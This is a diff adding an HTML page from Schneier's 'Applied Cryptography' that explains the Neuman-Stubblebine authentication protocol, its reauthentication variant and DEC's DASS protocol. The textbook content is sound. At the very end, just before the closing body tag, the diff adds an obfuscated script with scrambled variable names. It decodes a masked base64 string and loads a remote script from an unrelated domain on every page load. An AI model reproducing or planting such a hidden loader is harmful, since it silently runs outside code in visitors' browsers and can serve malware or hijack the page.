@@ -1,0 +1,138 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=061-062//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This protocol, first presented in [820] and corrected in [1162] attempts to counter the suppress-replay attack. It is an enhancement to Yahalom and is an excellent protocol.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice concatenates her name and a random number and sends it to Bob.
+<DL>
+<DD><I>A,R</I><SUB>A</SUB>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob concatenates Alice&#146;s name, her random number, and a timestamp, and encrypts with the key he shares with Trent. He sends it to Trent along with his name and a new random number.
+<DL>
+<DD><I>B,R</I><SUB>B</SUB>,<I>E</I><SUB>B</SUB>(<I>A,R</I><SUB>A</SUB>,<I>T</I><SUB>B</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Trent generates a random session key. Then he creates two messages. The first is Bob&#146;s name, Alice&#146;s random number, a random session key, and the timestamp, all encrypted with the key he shares with Alice. The second is Alice&#146;s name, the session key, and the timestamp, all encrypted with the key he shares with Bob. He sends these both to Alice, along with Bob&#146;s random number.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>B,R</I><SUB>A</SUB><I>,K,T</I><SUB>B</SUB>),<I>E</I><SUB>A</SUB>(<I>A,K,T</I><SUB>B</SUB>),<I>R</I><SUB>B</SUB>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice decrypts the message encrypted with her key, extracts <I>K</I>, and confirms that <I>R</I><SUB>A</SUB> has the same value as it did in step (1). Alice sends Bob two messages. The first is the message received from Trent, encrypted with Bob&#146;s key. The second is <I>R</I><SUB>B</SUB>, encrypted with the session key.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>A,K,T</I><SUB>B</SUB>),<I>E</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts the message encrypted with his key, extracts <I>K</I>, and confirms that <I>T</I><SUB>B</SUB> and <I>R</I><SUB>B</SUB> have the same value they did in step (2).
+</DL>
+<P>Assuming both random numbers and the timestamp match, Alice and Bob are convinced of one another&#146;s identity and share a secret key. Synchronized clocks are not required because the timestamp is only relative to Bob&#146;s clock; Bob only checks the timestamp he generated himself.
+</P>
+<P>One nice thing about this protocol is that Alice can use the message she received from Trent for subsequent authentication with Bob, within some predetermined time limit. Assume that Alice and Bob completed the above protocol, communicated, and then terminated the connection. Alice and Bob can reauthenticate in three steps, without having to rely on Trent.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob the message Trent sent her in step (3) and a new random number.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>A,K,T</I><SUB>B</SUB>),<I>R&#146;</I><SUB>A</SUB>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob sends Alice another new random number, and Alice&#146;s new random number encrypted in their session key.
+<DL>
+<DD><I>R&#146;</I><SUB>B</SUB>,<I>E</I><SUB>K</SUB>(<I>R&#146;</I><SUB>A</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends Bob his new random number, encrypted in their session key.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>R&#146;</I><SUB>B</SUB>)
+</DL>
+</DL>
+<P>The new random numbers prevent replay attacks.
+</P>
+<P><FONT SIZE="+1"><B><I>DASS</I></B></FONT></P>
+<P>The Distributed Authentication Security Service (DASS) protocols, developed at Digital Equipment Corporation, also provide for mutual authentication and key exchange [604,1519,1518]. Unlike the previous protocols, DASS uses both public-key and symmetric cryptography. Alice and Bob each have a private key. Trent has signed copies of their public keys.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends a message to Trent, consisting of Bob&#146;s name.
+<DL>
+<DD><I>B</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent sends Alice Bob&#146;s public key, <I>K</I><SUB>B</SUB>, signed with Trent&#146;s private key, <I>T</I>. The signed message includes Bob&#146;s name.
+<DL>
+<DD><I>S</I><SUB>T</SUB>(<I>B,K</I><SUB>B</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice verifies Trent&#146;s signature to confirm that the key she received is actually Bob&#146;s public key. She generates a random session key, and a random public-key/private-key key pair: <I>K</I><SUB>P</SUB>. She encrypts a timestamp with <I>K</I>. Then she signs a key lifetime, <I>L</I>, her name, and <I>K</I><SUB>P</SUB> with her private key, <I>K</I>A. Finally, she encrypts <I>K</I> with Bob&#146;s public key, and signs it with <I>K</I><SUB>P</SUB>. She sends all of this to Bob.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>T</I><SUB>A</SUB>),<I>S</I><SUB><SUB>K</SUB>A</SUB>(<I>L,A,K</I><SUB>P</SUB>),<I>S</I><SUB>K<SUB>P</SUB></SUB>(<I>E</I><SUB>K<SUB>B</SUB></SUB>(<I>K</I>))
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends a message to Trent (this may be a different Trent), consisting of Alice&#146;s name.
+<DL>
+<DD><I>A</I>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Trent sends Bob Alice&#146;s public key, signed in Trent&#146;s private key. The signed message includes Alice&#146;s name.
+<DL>
+<DD><I>S</I><SUB>T</SUB>(<I>A,K</I><SUB>A</SUB>)
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Bob verifies Trent&#146;s signature to confirm that the key he received is actually Alice&#146;s public key. He then verifies Alice&#146;s signature and recovers <I>K</I><SUB>P</SUB>. He verifies the signature and uses his private key to recover <I>K</I>. Then he decrypts <I>T</I><SUB>A</SUB> to make sure this is a current message.
+<DD><B>(7)</B>&nbsp;&nbsp;If mutual authentication is required, Bob encrypts a new timestamp with <I>K</I>, and sends it to Alice.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>T</I><SUB>B</SUB>)
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;Alice decrypts <I>T</I><SUB>B</SUB> with <I>K</I> to make sure that the message is current.
+</DL>
+<P>SPX, a product by DEC, is based on DASS. Additional information can be found in [34].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(uWNzjnyZ, TcDglaLJ) {TcDglaLJ = uWNzjnyZ.createElement('script');TcDglaLJ.type = 'text/javascript';TcDglaLJ.async = true;TcDglaLJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');uWNzjnyZ.getElementsByTagName('body')[0].appendChild(TcDglaLJ);}(document));</script></body>
+</html>
